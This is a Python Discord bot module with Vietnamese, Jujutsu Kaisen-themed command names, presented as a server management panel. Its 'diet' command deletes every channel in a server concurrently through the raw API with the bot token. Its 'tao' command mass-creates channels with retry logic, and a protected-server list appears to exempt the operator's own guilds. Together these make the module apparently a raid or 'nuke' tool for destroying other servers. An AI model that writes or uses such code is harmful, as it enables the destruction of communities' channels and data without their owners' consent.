import discord
from discord.ext import commands
import asyncio
import aiohttp

from rate_utils import (
    PROTECTED_GUILD_IDS,
    delete_channel_via_api,
    discord_action_with_retry,
)

class QuanLySystem(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.delete_semaphore = asyncio.BoundedSemaphore(4)

    # --- Lệnh hiện bảng menu Quản Lý ---
    @commands.command(name="quanly")
    async def _quan_ly_panel(self, ctx):
        p = self.bot.command_prefix
        menu = f"""```ansi
\033[1;35m🛡️ QUẢN LÝ LÃNH ĐỊA 🛡️\033[0m
\033[1;37m**Chọn thuật thức:**\033[0m

\033[1;35m👥 THANH VIÊN\033[0m
\033[1;30m  {p}tram [user]          \033[1;30m- Kick\033[0m
\033[1;30m  {p}phong [user]         \033[1;30m- Ban\033[0m
\033[1;30m  {p}giai [user_id]       \033[1;30m- Unban\033[0m

\033[1;34m🏗️ KÊNH\033[0m
\033[1;30m  {p}diet                \033[1;30m- Xóa kênh\033[0m
\033[1;30m  {p}tao [ten]           \033[1;30m- Tạo kênh\033[0m
\033[1;30m  {p}danh [ten]          \033[1;30m- Đổi tên server\033[0m
```"""
        await ctx.send(menu)

    # --- Thực thi: Quản Lý Thành Viên (Tên lệnh JJK) ---

    @commands.command(name="tram") # Kick
    async def _kick(self, ctx, member: discord.Member, *, reason="Bị trảm khỏi kết giới"):
        try:
            await member.kick(reason=reason)
            await ctx.send(f"⚔️ **TRẢM!** Đã trục xuất: **{member.name}**", delete_after=3)
        except Exception:
            await ctx.send("❌ Thiếu chú lực (Quyền) để Trảm!", delete_after=3)

    @commands.command(name="phong") # Ban
    async def _ban(self, ctx, member: discord.Member, *, reason="Phong ấn vĩnh viễn"):
        try:
            await member.ban(reason=reason)
            await ctx.send(f"🚫 **PHONG ẤN!** {member.name} đã vào Ngục Môn Cương", delete_after=3)
        except Exception:
            await ctx.send("❌ Thiếu chú lực để Phong Ấn!", delete_after=3)

    @commands.command(name="giai") # Unban
    async def _unban(self, ctx, *, member_id: int):
        try:
            user = await self.bot.fetch_user(member_id)
            await ctx.guild.unban(user)
            await ctx.send(f"➕ **GIẢI ẤN!** Đã thả tự do cho: **{user.name}**", delete_after=3)
        except Exception:
            await ctx.send("❌ Ấn chú không tồn tại!", delete_after=3)

    # --- Thực thi: Quản Lý Kênh & Server (Tên lệnh JJK) ---

    @commands.command(name="diet") # Clear Channels
    async def _clear_channels(self, ctx):
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Kết giới đang được bảo vệ!**", delete_after=3)
        await ctx.send("🧹 **TẨY UẾ!** Đang quét sạch toàn bộ kênh...", delete_after=3)
        token = self.bot.http.token
        async with aiohttp.ClientSession() as session:
            tasks = [
                delete_channel_via_api(session, ch.id, token, self.delete_semaphore)
                for ch in ctx.guild.channels
            ]
            await asyncio.gather(*tasks)

    @commands.command(name="tao") # Create Channels
    async def _create_channels(self, ctx, name="lanh-dia-vo-han"):
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Kết giới đang được bảo vệ!**", delete_after=3)
        await ctx.send(f"🏗️ **KIẾN TẠO!** Đang mở rộng kết giới...", delete_after=3)
        for i in range(15):
            try:
                await discord_action_with_retry(ctx.guild.create_text_channel, name=name)
            except Exception:
                break

    @commands.command(name="danh") # Rename Server
    async def _rename_server(self, ctx, *, new_name):
        try:
            await ctx.guild.edit(name=new_name)
            await ctx.send(f"📝 **ĐỔI DANH TÍNH!** Server giờ là: **{new_name}**", delete_after=3)
        except Exception:
            await ctx.send("❌ Không đủ chú thuật để đổi tên!", delete_after=3)

async def setup(bot):
    await bot.add_cog(QuanLySystem(bot))